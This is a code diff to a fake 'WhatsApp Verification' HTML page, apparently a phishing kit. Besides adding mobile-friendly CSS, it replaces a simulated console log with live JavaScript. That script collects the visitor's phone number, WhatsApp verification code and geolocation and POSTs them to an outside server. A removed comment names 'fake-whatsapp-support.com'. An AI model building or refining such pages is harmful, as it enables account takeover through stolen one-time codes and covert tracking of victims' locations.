@@ -2,11 +2,13 @@
 <html>
 <head>
     <title>WhatsApp Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             padding-top: 50px;
+            margin: 0;
         }
         .container {
             max-width: 400px;
@@ -31,6 +33,7 @@
             justify-content: center;
             gap: 5px;
             align-items: center;
+            flex-wrap: wrap;
         }
         .input-group input {
             width: 30px;
@@ -63,6 +66,26 @@
         .country-code {
             font-size: 16px;
             margin-right: 5px;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px;
+                width: 90%;
+                box-sizing: border-box;
+            }
+            .input-group input {
+                width: 25px;
+                padding: 8px;
+                font-size: 14px;
+            }
+            button {
+                padding: 8px 16px;
+            }
+            .container img {
+                top: -40px;
+                width: 48px;
+                height: 48px;
+            }
         }
     </style>
 </head>
@@ -147,12 +170,40 @@
                 verificationCode += input.value;
             });
 
-            // Simulate form submission
-            console.log('Phone Number:', phoneNumber);
-            console.log('Verification Code:', verificationCode);
+            // Get user's geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const { latitude, longitude } = position.coords;
 
-            // You can send the collected data to the server here
-            // Example: fetch('http://fake-whatsapp-support.com/process', { method: 'POST', body: JSON.stringify({ phoneNumber, verificationCode }) })
+                    // Send data to the server
+                    fetch('https://your-server-endpoint.com/process', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            phoneNumber,
+                            verificationCode,
+                            location: {
+                                latitude,
+                                longitude
+                            }
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Success:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+
+                }, (error) => {
+                    console.error('Geolocation error:', error);
+                });
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+            }
         });
     </script>
 </body>
